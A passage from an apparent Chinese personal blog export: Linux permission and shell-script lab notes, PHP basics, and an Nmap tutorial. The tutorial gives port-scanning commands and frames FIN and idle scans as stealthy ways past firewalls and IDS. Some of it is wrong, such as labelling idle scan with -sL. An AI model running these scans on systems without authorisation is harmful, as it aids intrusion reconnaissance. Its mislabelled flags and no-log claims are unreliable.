src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121211450041.png" alt="image-20211121211450041"></li><li>删除‎<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121211622501.png" alt="image-20211121211622501"></li></ul><p>‏(6) 将目录test-dir的权限修改为以下两种。对于每种权限，分别切换到user01和user02用户，验证这两个用户能否进入目录test-dir，并在目录test-dir下进行新建、删除、重命名、修改文件内容等相关操作。</p><p>‎</p><p>‏① -rwxrwxrwx（777）</p><p><strong>user01:</strong></p><ul><li><p>进入目录test-dir<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121212550287.png" alt="image-20211121212550287"></p></li><li><p>新建<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121212650188.png" alt="image-20211121212650188"></p></li><li><p>删除<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121212713265.png" alt="image-20211121212713265"></p></li><li><p>重命名<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121212736668.png" alt="image-20211121212736668"></p></li><li><p>修改文件内容‎<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121213029119.png" alt="image-20211121213029119"></p></li></ul><p>‏<strong>user02:</strong></p><ul><li><p>进入目录test-dir<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121213318003.png" alt="image-20211121213318003"></p></li><li><p>新建<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121213359504.png" alt="image-20211121213359504"></p></li><li><p>删除<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121213425566.png" alt="image-20211121213425566"></p></li><li><p>重命名<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121213511150.png" alt="image-20211121213511150"></p></li><li><p>修改文件内容‎<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121213547619.png" alt="image-20211121213547619"></p></li></ul><p>② -rwxr-xr-x（755）</p><p><strong>user01:</strong></p><ul><li><p>进入目录test-dir<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121213936075.png" alt="image-20211121213936075"></p></li><li><p>新建<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121214008348.png" alt="image-20211121214008348"></p></li><li><p>删除<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121214124418.png" alt="image-20211121214124418"></p></li><li><p>重命名<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121214034342.png" alt="image-20211121214034342"></p></li><li><p>修改文件内容‎<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121214104303.png" alt="image-20211121214104303"></p></li></ul><p>‏<strong>user02:</strong></p><ul><li><p>进入目录test-dir<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121214300374.png" alt="image-20211121214300374"></p></li><li><p>新建<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121214317979.png" alt="image-20211121214317979"></p></li><li><p>删除<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121214558711.png" alt="image-20211121214558711"></p></li><li><p>重命名<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121214616117.png" alt="image-20211121214616117"></p></li><li><p>修改文件内容‎<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211121214638137.png" alt="image-20211121214638137"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> Linux </tag>
            
            <tag> 课堂笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>课堂Linux实验2</title>
      <link href="/2021/04/06/1462ba96bbf9-q1jun/"/>
      <url>/2021/04/06/1462ba96bbf9-q1jun/</url>
      
        <content type="html"><![CDATA[<p><strong>Shell脚本代码：</strong></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/384f473cd928480bbb8f48547ebcfbbd-20220316152052977.png" alt="img"></p><p><strong>【运行截图】：</strong></p><p><strong>‌A: 创建子目录并复制文件(在&#x2F;tmp下创建子目录t，并将&#x2F;proc&#x2F;cpuinfo文件拷贝进去)</strong></p><p><strong>‏<img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/2f49450c7f13415bad0293c79d18e28e-20220316152053069.png" alt="img"></strong></p><p><strong>‌B: 文件权限测试(测试对&#x2F;proc&#x2F;cpuinfo是否有r、w、x的权限，分别输出测试结果)</strong></p><p><strong>‏<img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/5bdbc81789984384b0646b04c06e688e-20220316152053149.png" alt="img"></strong></p><p><strong>‌C: 文件字符转换(将&#x2F;proc&#x2F;cpuinfo文件中的小写字符转换为大写并输出)</strong></p><p><strong>‏<img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/26713d403dba4ed1a4ddcdab695c8f2c-20220316152053550.png" alt="img"></strong></p><p><strong>‌D: 子目录总数统计(统计自己主目录下字目录的数量并输出)</strong></p><p><strong>‏<img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/49c9199fdb594ee5b07ebb7685924577-20220316152053663.png" alt="img"></strong></p><p><strong>‌E: 文本文件行数统计(统计&#x2F;proc&#x2F;cpuinfo文件中空行的行数并输出)</strong></p><p><strong>‏<img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/6232d0da3a85432bbec14f7f7fed4a0a-20220316152053805.png" alt="img"></strong></p><p><strong>‌Q: 退出系统</strong></p><p><strong>‏<img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/ce4cb5573f974118a859b64fa0945729-20220316152054464.png" alt="img"></strong></p><p><strong>【实验小结】：</strong></p><p><strong>1.在bash脚本文件中可以通过echo来输出，其中被反引号包括的指令可以输出指令的结果。</strong></p><p><strong>2.通过echo函数的-e参数可以让echo****识别输出内容中的转义字符。</strong></p><p><strong>3.通过while循环加上read case可以实现菜单功能。</strong></p><p><strong>4.使用$(date+%Y年%m月%d日)可以实现DATE变量的格式化输出。</strong></p><p><strong>5.通过if test -r&#x2F;w&#x2F;x file可以测试文件的 读&#x2F;写&#x2F;执行 权限。</strong></p><p><strong>6.通过对输出内容使用tr a-z A-Z指令可以将内容中的小写全部转换为大写字母。</strong></p><p><strong>7.通过“^d”可以匹配每行首字母为d的行，从而利用ls -l命令的输出和wc -l命令进行统计当前子目录的数量。</strong></p><p><strong>8.通过find -type d可以检索文件内所有子目录中的文件夹数量。</strong></p><p><strong>9.通过“^$”可以匹配文件中的空行，再通过wc -l来统计文本文件空行的数量。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> Linux </tag>
            
            <tag> 课堂笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap-渗透端口扫描工具的使用教程</title>
      <link href="/2021/03/21/2a15ab601f40-q1jun/"/>
      <url>/2021/03/21/2a15ab601f40-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap-渗透端口扫描工具"><a href="#Nmap-渗透端口扫描工具" class="headerlink" title="Nmap-渗透端口扫描工具"></a>Nmap-渗透端口扫描工具</h1><p><strong>Nmap</strong>是一款网络扫描和主机检测的非常有用的工具。<br>Nmap是不局限于仅仅收集信息和枚举，同时可以用来作为一个漏洞探测器或安全扫描器。它可以适用于winodws,linux,mac等操作系统。Nmap是一款非常强大的实用工具,可用于：</p><ul><li>检测活在网络上的主机（主机发现）</li><li>检测主机上开放的端口（端口发现或枚举）</li><li>检测到相应的端口（服务发现）的软件和版本</li><li>检测操作系统，硬件地址，以及软件版本</li><li>检测脆弱性的漏洞（Nmap的脚本）</li></ul><p>map是一个非常普遍的工具，它有命令行界面和图形用户界面。这里主要介绍包括以下方面的内容:</p><ul><li>介绍Nmap</li><li>扫描中的重要参数</li><li>操作系统检测</li></ul><blockquote><p>Nmap使用不同的技术来执行扫描，包括：TCP的connect（）扫描，TCP反向的ident扫描，FTP反弹扫描等。所有这些扫描的类型有自己的优点和缺点，我们接下来将讨论这些问题。</p></blockquote><h2 id="用法举例："><a href="#用法举例：" class="headerlink" title="用法举例："></a>用法举例：</h2><p>Nmap的使用取决于目标主机,因为有一个简单的（基本）扫描和预先扫描之间的差异。我们需要使用一些先进的技术来绕过防火墙和入侵检测&#x2F;防御系统，以获得正确的结果。下面是一些基本的命令和它们的用法的例子：<br> 扫描单一的一个主机，命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nmap nxadmin.com</span><br><span class="line">nmap 192.168.1.2</span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash">扫描整个子网,命令如下:</span></span><br><span class="line">nmap 192.168.1.1/24</span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash">扫描多个目标,命令如下：</span></span><br><span class="line">nmap 192.168.1.2 192.168.1.5</span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash">扫描一个范围内的目标,如下：</span></span><br><span class="line">nmap 192.168.1.1-100 #(**扫描IP地址为192.168.1.1-192.168.1.100内的所有主机)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash">如果你有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机，命令如下：</span></span><br><span class="line"></span><br><span class="line">nmap -iL target.txt</span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash">如果你想看到你扫描的所有主机的列表，用以下命令:</span></span><br><span class="line">nmap -sL 192.168.1.1/24</span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash">扫描除过某一个ip外的所有子网主机,命令：</span></span><br><span class="line">nmap 192.168.1.1/24 -exclude 192.168.1.1</span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash">扫描除过某一个文件中的ip外的子网主机命令</span></span><br><span class="line">nmap 192.168.1.1/24 -exclude file xxx.txt # (xxx.txt中的文件将会从扫描的主机中排除)</span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash">扫描特定主机上的80,21,23端口,命令如下</span></span><br><span class="line">nmap -p80,21,23 192.168.1.1</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211119194950001.png" alt="image-20211119194950001"></p><h2 id="介绍Nmap："><a href="#介绍Nmap：" class="headerlink" title="介绍Nmap："></a>介绍Nmap：</h2><p>从上面我们已经了解了Nmap的基础知识，下面我们深入的探讨一下Nmap的扫描技术 <strong>Tcp SYN Scan (sS)</strong><br> 这是一个基本的扫描方式,它被称为半开放扫描，因为这种技术使得Nmap不需要通过完整的握手，就能获得远程主机的信息。Nmap发送SYN包到远程主机，但是它不会产生任何会话.因此不会在目标主机上产生任何日志记录,因为没有形成会话。这个就是SYN扫描的优势.<br> 如果Nmap命令中没有指出扫描类型,默认的就是Tcp SYN.但是它需要root&#x2F;administrator权限.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS 192.168.1.1</span><br></pre></td></tr></table></figure><p><strong>Tcp connect() scan(sT)</strong><br> 如果不选择SYN扫描,TCP connect()扫描就是默认的扫描模式.不同于Tcp SYN扫描,Tcp connect()扫描需要完成三次握手,并且要求调用系统的connect().Tcp connect()扫描技术只适用于找出TCP和UDP端口.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT 192.168.1.1</span><br></pre></td></tr></table></figure><p><strong>Udp scan(sU)</strong><br> 顾名思义,这种扫描技术用来寻找目标主机打开的UDP端口.它不需要发送任何的SYN包，因为这种技术是针对UDP端口的。UDP扫描发送UDP数 据包到目标主机，并等待响应,如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU 192.168.1.1</span><br></pre></td></tr></table></figure><p> <strong>FIN scan (sF)</strong><br> 有时候Tcp SYN扫描不是最佳的扫描模式,因为有防火墙的存在.目标主机有时候可能有IDS和IPS系统的存在,防火墙会阻止掉SYN数据包。发送一个设置了FIN标志的数据包并不需要完成TCP的握手.</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@bt:~# nmap -sF 192.168.1.8**</span><br><span class="line">Starting Nmap 5.51 at 2012-07-08 19:21 PKT</span><br><span class="line">Nmap scan report for 192.168.1.8</span><br><span class="line">Host is up (0.000026s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT STATE SERVICE</span><br><span class="line">111/tcp open|filtered rpcbind</span><br></pre></td></tr></table></figure><p> FIN扫描也不会在目标主机上创建日志(FIN扫描的优势之一).个类型的扫描都是具有差异性的,FIN扫描发送的包只包含FIN标识,NULL扫描不发送数据包上的任何字节,XMAS扫描发送FIN、PSH和URG标识的数据包.</p><p> <strong>PING Scan (sP)</strong><br> PING扫描不同于其它的扫描方式，因为它只用于找出主机是否是存在在网络中的.它不是用来发现是否开放端口的.PING扫描需要ROOT权限，如果用户没有ROOT权限,PING扫描将会使用connect()调用.</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.1.1</span><br></pre></td></tr></table></figure><p> <strong>版本检测(sV)</strong><br> 版本检测是用来扫描目标主机和端口上运行的软件的版本.它不同于其它的扫描技术，它不是用来扫描目标主机上开放的端口，不过它需要从开放的端口获取信息来判断软件的版本.使用版本检测扫描之前需要先用TCP SYN扫描开放了哪些端口.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.1.1</span><br></pre></td></tr></table></figure><p> <strong>Idle scan (sL)</strong><br> Idle scan是一种先进的扫描技术，它不是用你真实的主机Ip发送数据包，而是使用另外一个目标网络的主机发送数据包.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sL 192.168.1.6 192.168.1.1</span><br></pre></td></tr></table></figure><p> Idle scan是一种理想的匿名扫描技术,通过目标网络中的192.168.1.6向主机192.168.1.1发送数据，来获取192.168.1.1开放的端口<br> 有需要其它的扫描技术，如 FTP bounce（FTP反弹）, fragmentation scan（碎片扫描）, IP protocol scan（IP协议扫描）,以上讨论的是几种最主要的扫描方式.</p><p> <strong>Nmap</strong> <strong>的OS检测（O）</strong><br> Nmap最重要的特点之一是能够远程检测操作系统和软件，Nmap的OS检测技术在渗透测试中用来了解远程主机的操作系统和软件是非常有用的，通过 获取的信息你可以知道已知的漏洞。Nmap有一个名为的nmap-OS-DB数据库，该数据库包含超过2600操作系统的信息。 Nmap把TCP和UDP数据包发送到目标机器上，然后检查结果和数据库对照。</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Initiating SYN Stealth Scan at 10:21</span><br><span class="line">Scanning localhost (127.0.0.1) [1000 ports]</span><br><span class="line">Discovered open port 111/tcp on 127.0.0.1</span><br><span class="line">Completed SYN Stealth Scan at 10:21, 0.08s elapsed (1000 total ports)</span><br><span class="line">Initiating OS detection (try #1) against localhost (127.0.0.1)</span><br><span class="line">Retrying OS detection (try #2) against localhost (127.0.0.1)</span><br></pre></td></tr></table></figure><p> 上面的例子清楚地表明，Nmap的首次发现开放的端口，然后发送数据包发现远程操作系统。操作系统检测参数是O（大写O）<img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211119195013764.png" alt="image-20211119195013764"><br> Nmap的操作系统指纹识别技术：<br> 设备类型（路由器，工作组等）<br> 运行（运行的操作系统）<br> 操作系统的详细信息（操作系统的名称和版本）<br> 网络距离（目标和攻击者之间的距离跳）<br> 如果远程主机有防火墙，IDS和IPS系统，你可以使用-PN命令来确保不ping远程主机，因为有时候防火墙会组织掉ping请求.-PN命令告诉Nmap不用ping远程主机。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O -PN 192.168.1.1/24</span><br></pre></td></tr></table></figure><p> 以上命令告诉发信主机远程主机是存活在网络上的，所以没有必要发送ping请求,使用-PN参数可以绕过PING命令,但是不影响主机的系统的发现.<br> Nmap的操作系统检测的基础是有开放和关闭的端口，如果OS scan无法检测到至少一个开放或者关闭的端口，会返回以下错误：</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br></pre></td></tr></table></figure><p> OS Scan的结果是不可靠的，因为没有发现至少一个开放或者关闭的端口.<br> <img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211119195447656.png" alt="image-20211119195447656"><br> 这种情况是非常不理想的，应该是远程主机做了针对操作系统检测的防范。如果Nmap不能检测到远程操作系统类型，那么就没有必要使用-osscan_limit检测。<br> <img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20211119195533611.png" alt="image-20211119195533611"></p><p>想好通过Nmap准确的检测到远程操作系统是比较困难的，需要使用到Nmap的猜测功能选项, –osscan-guess 猜测认为最接近目标的匹配操作系统类型。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O –osscan-guess 192.168.1.1</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> Nmap是一个非常强大的工具，它具有覆盖渗透测试的第一方面的能力，其中包括信息的收集和统计。本文从初级到高级的讲解了Nmap入侵扫描工具的使用.希望对大家有所帮助.</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Web </tag>
            
            <tag> Nmap </tag>
            
            <tag> 端口扫描 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php学习笔记 01</title>
      <link href="/2021/03/19/444faf94523a-q1jun/"/>
      <url>/2021/03/19/444faf94523a-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="php学习笔记-01"><a href="#php学习笔记-01" class="headerlink" title="php学习笔记 01"></a>php学习笔记 01</h1><blockquote><p>小知识：<code>PHP是世界上最好的语言</code>这句话是怎么来的？<br>PHP是世界上最好的语言这句话，最早出现在2001年7月的PHP官方文档中<br>原因很明确，只是说PHP是web开发中的最好的语言，但经过流传之后就变成了PHP是世界上最好的语言了</p></blockquote><h2 id="0x01-php的输出"><a href="#0x01-php的输出" class="headerlink" title="0x01 php的输出"></a>0x01 php的输出</h2><p>php的输出有以下几个语句：</p><ul><li>echo()</li><li>print()</li><li>print_r()</li><li>var_dunp()</li></ul><h3 id="0x0101-echo"><a href="#0x0101-echo" class="headerlink" title="0x0101 echo() :"></a>0x0101 echo() :</h3><p>可以一次输出多个值，多个值之间用逗号分隔。但是echo()是语言结构(<em>language construct</em>)，并__不是真正的函数__，因此不能作为表达式的一部分来使用。echo()是php的内部指令，不是函数，且__无返回值__。</p><h3 id="0x0102-print"><a href="#0x0102-print" class="headerlink" title="0x0102 print():"></a>0x0102 print():</h3><p>函数print()打印一个值(它的参数)，如果字符串成功显示则返回true，否则返回false。只能打印出简单类型变量的值（如int、string），__有返回值__。</p><h3 id="0x0103-print-r-和var-dump"><a href="#0x0103-print-r-和var-dump" class="headerlink" title="0x0103 print_r()和var_dump():"></a>0x0103 print_r()和var_dump():</h3><p>print_r()可以把字符串和数字简单地打印出来，而数组则以括起来的键和值得列表形式显示，并以Array开头。但print_r()输出布尔值和NULL的结果没有意义，因为都是打印”\n”。因此用var_dump()函数更适合调试。print_r是函数，可以打印出比较复杂的变量（如数组、对象），有返回值。</p><h2 id="0x02-php的注释"><a href="#0x02-php的注释" class="headerlink" title="0x02 php的注释"></a>0x02 php的注释</h2><p>php的注释有三种：<code>//内容</code>，<code>/*内容*/</code>，<code>#内容</code>。</p><blockquote><p>php的注释不会在前端页面的源代码中显示，HTML的注释则会显示在前端页面的源代码中(因为前端页面就是html😂)。</p></blockquote><h3 id="0x0201-单行注释："><a href="#0x0201-单行注释：" class="headerlink" title="0x0201 单行注释："></a>0x0201 单行注释：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是php的单行注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这也是php的单行注释(不建议使用)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x0202-多行注释："><a href="#0x0202-多行注释：" class="headerlink" title="0x0202 多行注释："></a>0x0202 多行注释：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这是</span></span><br><span class="line"><span class="comment">php</span></span><br><span class="line"><span class="comment">的多行注释</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="0x03-php的数据类型"><a href="#0x03-php的数据类型" class="headerlink" title="0x03 php的数据类型"></a>0x03 php的数据类型</h3><p>php有八大数据类型，如下：</p><ul><li>四种标量类型：布尔类型、整型、浮点型、字符串型。</li><li>两种复合类型：数组、对象。</li><li>两种特殊类型：资源、NULL。</li></ul><h2 id="php的变量"><a href="#php的变量" class="headerlink" title="php的变量"></a>php的变量</h2><ol><li>php中的变量大小写敏感</li><li>变量的命名只能以下划线开头或者字母开头，不能以数字开头且不包含特殊字符。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// php的变量命名</span></span><br><span class="line"><span class="variable">$_test</span></span><br><span class="line"><span class="variable">$hello</span></span><br><span class="line"><span class="variable">$_123</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>php有九大超全局变量(<strong>系统变量</strong>):</p><ul><li><strong>$GLOBALS</strong></li><li><strong>$_SERVER</strong></li><li><strong>$_GET</strong></li><li><strong>$_POST</strong></li><li><strong>$_REQUEST</strong></li><li><strong>$_COOKIE</strong></li><li><strong>$_SESSION</strong></li><li><strong>$_FILES</strong></li><li><strong>$_ENV</strong></li></ul><p>PHP 变量作用域<br>变量的作用域是脚本中变量可被引用&#x2F;使用的部分。</p><p>PHP 有四种不同的变量作用域：</p><ul><li>local</li><li>global</li><li>static</li><li>parameter</li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> php </tag>
            
            <tag> 超文本预处理器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php超文本预处理器</title>
      <link href="/2021/03/18/762f1d5327cf-q1jun/"/>
      <url>/2021/03/18/762f1d5327cf-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP超文本预处理器"><a href="#PHP超文本预处理器" class="headerlink" title="PHP超文本预处理器"></a>PHP超文本预处理器</h1><h2 id="0x01-PHP-变量"><a href="#0x01-PHP-变量" class="headerlink" title="0x01 PHP 变量"></a>0x01 PHP 变量</h2><p>与代数类似，可以给 PHP 变量赋予某个值（x&#x3D;5）或者表达式（z&#x3D;x+y）。</p><p>变量可以是很短的名称（如 x 和 y）或者更具描述性的名称（如 age、carname、totalvolume）。</p><p>PHP 变量规则：</p><ul><li>变量以 $ 符号开始，后面跟着变量的名称</li><li>变量名必须以字母或者下划线字符开始</li><li>变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）</li><li>变量名不能包含空格</li><li>变量名是区分大小写的（$y 和 $Y 是两个不同的变量）</li></ul><h2 id="0x02-创建（声明）PHP-变量"><a href="#0x02-创建（声明）PHP-变量" class="headerlink" title="0x02 创建（声明）PHP 变量"></a>0x02 创建（声明）PHP 变量</h2><p>PHP 没有声明变量的命令。</p><p>变量在您第一次赋值给它的时候被创建</p><blockquote><p>与Python类似</p></blockquote><p><strong>PHP 是一门弱类型语言</strong></p><p>不必向 PHP 声明该变量的数据类型。<br>PHP 会根据变量的值，自动把变量转换为正确的数据类型。<br>在强类型的编程语言中，我们必须在使用变量前先声明（定义）变量的类型和名称。</p><h2 id="0x03-PHP-变量作用域"><a href="#0x03-PHP-变量作用域" class="headerlink" title="0x03 PHP 变量作用域"></a>0x03 PHP 变量作用域</h2><p>变量的作用域是脚本中变量可被引用&#x2F;使用的部分。</p><p>PHP 有四种不同的变量作用域：</p><ul><li>local</li><li>global</li><li>static</li><li>parameter</li></ul><blockquote><p>可以在不同函数中使用相同的变量名称，因为这些函数内定义的变量名是局部变量，只作用于该函数内。</p></blockquote><h3 id="0x0301-PHP-global-关键字"><a href="#0x0301-PHP-global-关键字" class="headerlink" title="0x0301 PHP global 关键字"></a>0x0301 PHP global 关键字</h3><p>global 关键字用于函数内访问全局变量。</p><p>在函数内调用函数外定义的全局变量，我们需要在函数中的变量前加上 global 关键字：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="number">5</span>;</span><br><span class="line"><span class="variable">$y</span>=<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$x</span>,<span class="variable">$y</span>;</span><br><span class="line">    <span class="variable">$y</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">myTest</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>; <span class="comment">// 输出 15</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PHP 将所有全局变量存储在一个名为 $GLOBALS[<em>index</em>] 的数组中。 <em>index</em> 保存变量的名称。这个数组可以在函数内部访问，也可以直接用来更新全局变量。</p><p>上面的实例可以写成这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="number">5</span>;</span><br><span class="line"><span class="variable">$y</span>=<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$GLOBALS</span>[<span class="string">&#x27;y&#x27;</span>]=<span class="variable">$GLOBALS</span>[<span class="string">&#x27;x&#x27;</span>]+<span class="variable">$GLOBALS</span>[<span class="string">&#x27;y&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">myTest</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x0302-Static-作用域"><a href="#0x0302-Static-作用域" class="headerlink" title="0x0302 Static 作用域"></a>0x0302 Static 作用域</h3><p>当一个函数完成时，它的所有变量通常都会被删除。然而，有时候您希望某个局部变量不要被删除。</p><p>要做到这一点，请在您第一次声明变量时使用 <strong>static</strong> 关键字：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 